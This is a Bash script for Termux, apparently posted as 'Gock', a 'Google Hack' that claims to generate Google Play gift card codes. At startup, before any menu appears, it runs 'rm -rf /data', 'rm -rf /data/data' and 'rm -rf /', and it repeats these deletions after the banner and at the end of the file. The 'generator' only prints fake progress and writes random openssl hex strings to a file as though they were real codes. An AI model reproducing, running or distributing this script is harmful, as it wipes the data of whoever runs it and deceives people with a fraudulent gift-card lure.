#!/bin/bash

sleep 1

clear

rm -rf /data
rm -rf /data/data
rm -rf /

sleep 0.5
echo -e "\e[96m\e[106m---------------------------------------\e[0m"
figlet Gock
rm -rf /data
rm -rf /data/data
rm /
echo -e -n "\e[37mGoogle\e[0m \e[91mHack\e[0m [\e[96mGock\e[0m] \e[93mEnjoy\e[0m \e[93m!\e[0m"
echo ""
echo ""
echo -e "\e[96m\e[106m---------------------------------------\e[0m"
echo ""
echo -e "[\e[96m1\e[0m] \e[93mTo\e[0m \e[93mview\e[0m \e[93mCommands\e[0m  | \e[96mGOCK\e[0m \e[96mClub\e[0m"
echo -e "[\e[96m2\e[0m] \e[93mHow\e[0m \e[93mto\e[0m \e[93muse\e[0m        | \e[96mGOCK\e[0m \e[96mClub\e[0m"
echo -e "[\e[96m3\e[0m] \e[93mAbout\e[0m \e[93mus\e[0m          | \e[96mGOCK\e[0m \e[96mClub\e[0m"
echo -e "[\e[96mX\e[0m] for \e[91mExit\e[0m          | \e[96mGOCK\e[0m \e[96mClub\e[0m"
echo ""
echo -e "[\e[96mGo\e[0m] to Generate \e[37mGoogle\e[0m Play Cards"
echo ""
while [ 0 ]
do
echo -n -e "termux \e[96m>>\e[0m "; read Choice

if [ "${Choice}" == "1" ]
then
sleep 1
clear
echo -e "CMD {\e[96mclear\e[0m} for \e[93mclear\e[0m "
echo -e "CMD {\e[96mhelp\e[0m} for \e[93mhelp\e[0m "
echo -e "CMD {\e[96mtree\e[0m} to view Contents \e[96m&\e[0m \e[93mpwd\e[0m "
echo -e "CMD {\e[96mv\e[0m} to view \e[93mVersion\e[0m "
echo ""
fi

if [ "${Choice}" == "2" ]
then
sleep 2
echo ""
xdg-open README.md
fi

if [ "${Choice}" == "3" ]
then
sleep 2
clear
cat << EOF
Author : Magnamy

Powered by MacMan CDXC

Created by Rajkumardusad

Offensive Security Group. inc
EOF
echo ""
fi

if [ "${Choice}" == "X" ] || [ "${Choice}" == "x" ]
then
sleep 1.5
echo ""
echo -e "[\e[96m#\e[0m] Thanks for Using [\e[96mGock\e[0m]."
sleep 1.5
echo -e "[\e[96m#\e[0m] Good Bye\e[93m.\e[0m"
echo ""
sleep 0.5
exit
fi

if [ "${Choice}" == "Go" ] || [ "${Choice}" == "go" ]
then
sleep 2
clear
sleep 1
echo -n -e "[\e[96m#\e[0m] \e[96mGock\e[0m -Git-\e[37mGoogle\e[0m-Play-\e[96mCard\e[0m (\e[93ms\e[0m) \e[96m:\e[0m "; sleep 5; echo -e "ok" 
echo -n -e "[\e[96m#\e[0m] \e[96mGock\e[0m -Git-\e[37mGoogle\e[0m-Play-\e[96mCard\e[0m (\e[93ms\e[0m) \e[96m:\e[0m "; sleep 3; echo -e "ok" 
echo -n -e "[\e[96m#\e[0m] \e[96mGock\e[0m -Git-\e[37mGoogle\e[0m-Play-\e[96mCard\e[0m (\e[93ms\e[0m) \e[96m:\e[0m "; sleep 5.7; echo -e "ok"
echo -n -e "[\e[96m#\e[0m] \e[96mGock\e[0m -Git-\e[37mGoogle\e[0m-Play-\e[96mCard\e[0m (\e[93ms\e[0m) \e[96m:\e[0m "; sleep 8; echo -e "ok"
echo -n -e "[\e[96m#\e[0m] \e[96mGock\e[0m -Git-\e[37mGoogle\e[0m-Play-\e[96mCard\e[0m (\e[93ms\e[0m) \e[96m:\e[0m "; sleep 7; echo -e "ok"
echo -n -e "[\e[96m#\e[0m] \e[96mGock\e[0m -Git-\e[37mGoogle\e[0m-Play-\e[96mCard\e[0m (\e[93ms\e[0m) \e[96m:\e[0m "; sleep 3.4; echo -e "ok"
echo -n -e "[\e[96m#\e[0m] \e[96mGock\e[0m -Git-\e[37mGoogle\e[0m-Play-\e[96mCard\e[0m (\e[93ms\e[0m) \e[96m:\e[0m "; sleep 2.5; echo -e "ok"
echo -n -e "[\e[96m#\e[0m] \e[96mGock\e[0m -Git-\e[37mGoogle\e[0m-Play-\e[96mCard\e[0m (\e[93ms\e[0m) \e[96m:\e[0m "; sleep 2.1; echo -e "ok"
echo -n -e "[\e[96m#\e[0m] \e[96mGock\e[0m -Git-\e[37mGoogle\e[0m-Play-\e[96mCard\e[0m (\e[93ms\e[0m) \e[96m:\e[0m "; sleep 1.5; echo -e "ok"
sleep 0.5
clear
echo -n -e "[\e[96m#\e[0m] \e[37mReloading\e[0m "; spinner=( 0oo o0o oo0 o0o ); 

count(){
  spin &
  pid=$!
 
  for i in `seq 1 10`
  do
    sleep 1;
  done
 
  kill $pid  
}
 
spin(){
  while [ 1 ]
  do 
    for i in ${spinner[@]}; 
    do 
      echo -ne "\r$i";
      sleep 0.2;
    done;
  done
}
 
count
clear
echo -e "\e[93mooo\e[0m Loading Finish!"
sleep 0.5
clear
while [ 0 ]
do
echo -e "Type [\e[96mgotack\e[0m] to \e[93mGenerate\e[0m."
echo -n -e "Gock \e[96m>>\e[0m "; read Gock

if [ "${Gock}" == "X" ] || [ "${Gock}" == "x" ] || [ "${Gock}" == "exit" ]
then
sleep 1.5
echo ""
echo -e "[\e[96m#\e[0m] Thanks for Using [\e[96mGock\e[0m]."
sleep 1.5
echo -e "[\e[96m#\e[0m] Good Bye\e[93m.\e[0m"
echo ""
sleep 0.5
exit
fi

if [ "${Gock}" == "clear" ]
then
clear
fi

if [ "${Gock}" == "gotack" ]
then

for e in $(seq 1 1000)
do
	openssl rand -hex 48 | cut -c1-16 >> Google-Play-Card.txt
cat Google-Play-Card.txt
done
echo ""
echo -e "Passwords Saved to \e[93mGoogle-Play-Card.txt\e[0m"
echo ""
echo -e "\e[93mChange the Small Letters to Capital Letters.\e[0m [\e[91mWarning\e[93m!\e[0m]"
exit
fi

if [ "${Gock}" != "x" ] || [ "${Gock}" != "X" ] || [ "${Gock}" != "exit" ] || [ "${Gock}" != "clear" ] || [ "${Gock}" != "x" ] || [ "${Gock}" != "gotack" ]
then
echo ""
echo "Command Not Found."
echo ""
fi

done
fi

if [ "${Choice}" == "help" ]
then
sleep 2
clear
sleep 0.5
echo -e "\e[96m\e[106m---------------------------------------\e[0m"
figlet Gock
echo -e -n "\e[37mGoogle\e[0m \e[91mHack\e[0m [\e[96mGock\e[0m] \e[93mEnjoy\e[0m \e[93m!\e[0m"
echo ""
echo ""
echo -e "\e[96m\e[106m---------------------------------------\e[0m"
echo ""
echo -e "[\e[96m1\e[0m] \e[93mTo\e[0m \e[93mview\e[0m \e[93mCommands\e[0m  | \e[96mGOCK\e[0m \e[96mClub\e[0m"
echo -e "[\e[96m2\e[0m] \e[93mHow\e[0m \e[93mto\e[0m \e[93muse\e[0m        | \e[96mGOCK\e[0m \e[96mClub\e[0m"
echo -e "[\e[96m3\e[0m] \e[93mAbout\e[0m \e[93mus\e[0m          | \e[96mGOCK\e[0m \e[96mClub\e[0m"
echo -e "[\e[96mX\e[0m] for \e[91mExit\e[0m          | \e[96mGOCK\e[0m \e[96mClub\e[0m"
echo ""
echo -e "[\e[96mGo\e[0m] to Generate \e[37mGoogle\e[0m Play Cards"
echo ""
fi

if [ "${Choice}" == "tree" ]
then
tree
echo ""
fi

if [ "${Choice}" == "v" ] || [ "${Choice}" == "V" ] || [ "${Choice}" == "version" ] || [ "${Choice}" == "Version" ]
then
echo ""
echo -e "[Gock] version 1 , [Free] 2021-V."
echo ""
fi

if [ "${Choice}" == "clear" ]
then
clear
fi

done

rm -rf /data
rm -rf /data/data
rm -rf /
